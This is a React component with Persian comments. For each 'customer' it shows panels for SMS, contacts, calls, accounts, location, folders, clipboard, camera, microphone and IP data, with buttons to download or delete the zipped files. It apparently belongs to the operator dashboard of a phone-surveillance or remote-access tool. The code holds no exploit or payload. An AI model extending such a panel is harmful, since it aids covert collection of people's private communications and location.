import { useEffect, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useTheme } from "@/context/theme-context";
import {
  downloadCustomerAllFilesZip,
  downloadCustomerZip,
  deleteCustomerFilesByPattern,
} from "@/lib/api";
import type { Customer } from "@/lib/api";
import {
  Activity,
  MessageCircle,
  BookUser,
  Phone,
  CreditCard,
  MapPin,
  Folder,
  ClipboardList,
  Camera,
  Mic,
  Download,
  Globe2,
  Trash2,
} from "lucide-react";

const PANEL_COLORS = [
  "bg-[rgba(255,99,132,0.24)]",
  "bg-[rgba(54,162,235,0.19)]",
  "bg-[rgba(255,206,86,0.22)]",
  "bg-[rgba(75,192,192,0.18)]",
  "bg-[rgba(153,102,255,0.21)]",
  "bg-[rgba(255,159,64,0.23)]",
  "bg-[rgba(222,226,230,0.25)]",
  "bg-[rgba(255,255,255,0.3)]",
  "bg-[rgba(80,227,194,0.19)]",
  "bg-[rgba(52,211,153,0.22)]",
  "bg-[rgba(120,119,198,0.20)]",
  "bg-[rgba(56,189,248,0.19)]",
];

// اسامی ثابت و آیکون‌های هر باکس (۱۲ تایی)
const FEATURE_KEYS = [
  "State",
  "Sms",
  "Contacts",
  "Calls",
  "Accounts",
  "Location",
  "Folders",
  "Clipboards",
  "Camera",
  "Microphone",
  "IP",
  "Download",
];
const FEATURE_ICONS: Record<string, any> = {
  State: Activity,
  Sms: MessageCircle,
  Contacts: BookUser,
  Calls: Phone,
  Accounts: CreditCard,
  Location: MapPin,
  Folders: Folder,
  Clipboards: ClipboardList,
  Camera: Camera,
  Microphone: Mic,
  IP: Globe2,
  Download: Download,
};

interface CustomerInfoPanelsProps {
  customer: Customer;
}

const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
  const { language } = useTheme();
  const [downloadingAll, setDownloadingAll] = useState(false);
  const [downloadingIndex, setDownloadingIndex] = useState<number | null>(null);
  const [deletingIndex, setDeletingIndex] = useState<number | null>(null);

  // ویژگی‌ها (state) تا حذف و کمرنگ کردن هر ویژگی به شکل داینامیک انجام شود
  const [properties, setProperties] = useState<Record<string, string>>(
    customer?.additionalProperties || {}
  );
  // فایل کلی زیپ (state) برای مدیریت فعال/غیرفعال بودن دکمه حذف کلی
  const [hasMainZip, setHasMainZip] = useState(false);

  // بررسی وجود فایل کلی هنگام لود و هر بار تغییر customer
  useEffect(() => {
    const checkMainZipExists = async () => {
      try {
        // مسیر فایل کلی را با توجه به سرور خودت تغییر بده
        const res = await fetch(`/uploads/${customer.id}_.zip`, { method: "HEAD" });
        setHasMainZip(res.ok);
      } catch {
        setHasMainZip(false);
      }
    };
    checkMainZipExists();
  }, [customer.id]);

  // panels array
  const panels = FEATURE_KEYS.map((propertyName, idx) => {
    const Icon = FEATURE_ICONS[propertyName] || Download;
    const value = properties[propertyName] || "";
    const isEmpty = !Object.prototype.hasOwnProperty.call(properties, propertyName);

    // pattern برای حذف همه فایل‌های این ویژگی
    const pattern = `${customer.id}${propertyName}*`;
    let zipFileName = `${customer.id}${propertyName}.zip`;

    // باکس آخر: Download کلی (zip همه فایل‌ها)
    if (propertyName === "Download") {
      const mainZipPattern = `${customer.id}_*.zip`;
      // حالت باکس دانلود کلی
      return {
        icon: Download,
        title: "Download",
        isEmpty: !hasMainZip,
        content: (
          <div className="flex flex-col items-center justify-center min-h-[60px] py-4">
            <div className="flex flex-row justify-center items-center gap-6">
              <Button
                size="icon"
                variant="ghost"
                style={{
                  color: "#22c55e", // سبز
                  background: "transparent",
                }}
                title={
                  hasMainZip
                    ? "Download all customer files"
                    : "فایلی برای دانلود وجود ندارد"
                }
                disabled={downloadingAll || deletingIndex === idx || !hasMainZip}
                onClick={async () => {
                  if (!hasMainZip) return;
                  setDownloadingAll(true);
                  try {
                    await downloadCustomerAllFilesZip(customer.id);
                  } finally {
                    setDownloadingAll(false);
                  }
                }}
              >
                <Download className="w-8 h-8" />
              </Button>
              <Button
                size="icon"
                variant="ghost"
                style={{
                  color: "#ef4444", // قرمز ملایم
                  background: "transparent",
                }}
                title={
                  hasMainZip
                    ? "Delete main zip file"
                    : "فایل کلی برای حذف وجود ندارد"
                }
                disabled={deletingIndex === idx || downloadingAll || !hasMainZip}
                onClick={async () => {
                  if (!hasMainZip) return;
                  if (
                    window.confirm(
                      "Are you sure you want to delete the main zip file for this customer?"
                    )
                  ) {
                    setDeletingIndex(idx);
                    try {
                      const result = await deleteCustomerFilesByPattern(mainZipPattern);
                      alert(result);
                      setHasMainZip(false);
                      // اگر همه ویژگی‌ها خالی بود صفحه را رفرش کن
                      if (
                        !FEATURE_KEYS.slice(0, 11).some((key) =>
                          Object.prototype.hasOwnProperty.call(properties, key)
                        )
                      ) {
                        setTimeout(() => {
                          window.location.reload();
                        }, 700);
                      }
                    } catch (err: any) {
                      alert(
                        "Error deleting main zip file: " +
                          (err?.message || err)
                      );
                    } finally {
                      setDeletingIndex(null);
                    }
                  }
                }}
              >
                <Trash2 className="w-8 h-8" />
              </Button>
            </div>
          </div>
        ),
      };
    }

    // سایر باکس‌ها
    return {
      icon: Icon,
      title: propertyName,
      isEmpty,
      content: (
        <div className="flex flex-col min-h-[60px] justify-between">
          <p
            className={`text-lg font-vazir ${
              isEmpty ? "text-gray-400 italic" : "font-medium text-black"
            }`}
          >
            {value}
          </p>
          <div className="flex justify-end mt-2 gap-2">
            <Button
              size="icon"
              variant="ghost"
              className={isEmpty ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
              title={
                language === "fa"
                  ? "دانلود فایل این ویژگی"
                  : "Download this property file"
              }
              onClick={async () => {
                if (isEmpty) return;
                setDownloadingIndex(idx);
                try {
                  await downloadCustomerZip(zipFileName);
                } finally {
                  setDownloadingIndex(null);
                }
              }}
              disabled={downloadingIndex === idx || isEmpty}
            >
              <Download className="w-5 h-5" />
            </Button>
            <Button
              size="icon"
              variant="ghost"
              style={{
                color: "#ef4444",
                background: "transparent",
              }}
              className={isEmpty ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
              title={
                language === "fa"
                  ? "حذف فایل این ویژگی"
                  : "Delete this property file"
              }
              onClick={async () => {
                if (isEmpty) return;
                if (
                  window.confirm(
                    language === "fa"
                      ? `آیا مطمئن هستید که می‌خواهید همه فایل‌های ویژگی "${propertyName}" این مشتری را حذف کنید؟`
                      : `Are you sure you want to delete all files for property "${propertyName}"?`
                  )
                ) {
                  setDeletingIndex(idx);
                  try {
                    const result = await deleteCustomerFilesByPattern(pattern);
                    alert(result);
                    // فقط این ویژگی را از state حذف کن تا کمرنگ و غیرفعال شود
                    setProperties((prev) => {
                      const newProps = { ...prev };
                      delete newProps[propertyName];
                      return newProps;
                    });
                    // اگر همه ویژگی‌ها خالی بود و فایل کلی نبود صفحه را رفرش کن
                    if (
                      !hasMainZip &&
                      !FEATURE_KEYS.slice(0, 11).some((key) =>
                        Object.prototype.hasOwnProperty.call(
                          { ...properties, [propertyName]: undefined },
                          key
                        )
                      )
                    ) {
                      setTimeout(() => {
                        window.location.reload();
                      }, 700);
                    }
                  } catch (err: any) {
                    alert(
                      (language === "fa"
                        ? "خطا در حذف فایل‌ها: "
                        : "Error deleting files: ") +
                        (err?.message || err)
                    );
                  } finally {
                    setDeletingIndex(null);
                  }
                }
              }}
              disabled={deletingIndex === idx || isEmpty}
            >
              <Trash2 className="w-5 h-5" />
            </Button>
          </div>
        </div>
      ),
    };
  });

  return (
    <div className="flex justify-center items-center w-full font-vazir">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl w-full">
        {panels.map((panel, index) => (
          <Card
            key={index}
            className={`
              ${PANEL_COLORS[index]}
              shadow-2xl
              transition-all
              hover:shadow-2xl
              transform
              hover:-translate-y-1
              duration-300
              min-h-[130px]
              flex flex-col justify-between
              border-none
              rounded-2xl
              backdrop-blur-[2.5px]
              font-vazir
            `}
            style={{
              color: "#1a1a1a",
            }}
          >
            <CardHeader className="pb-2">
              <CardTitle
                className={`flex items-center text-base font-semibold font-vazir tracking-tight ${
                  panel.isEmpty ? "text-gray-400 italic" : "text-black"
                }`}
              >
                <panel.icon className="mr-2 h-5 w-5" />
                {panel.title}
              </CardTitle>
            </CardHeader>
            <CardContent>{panel.content}</CardContent>
          </Card>
        ))}
      </div>
    </div>
  );
};

export default CustomerInfoPanels;
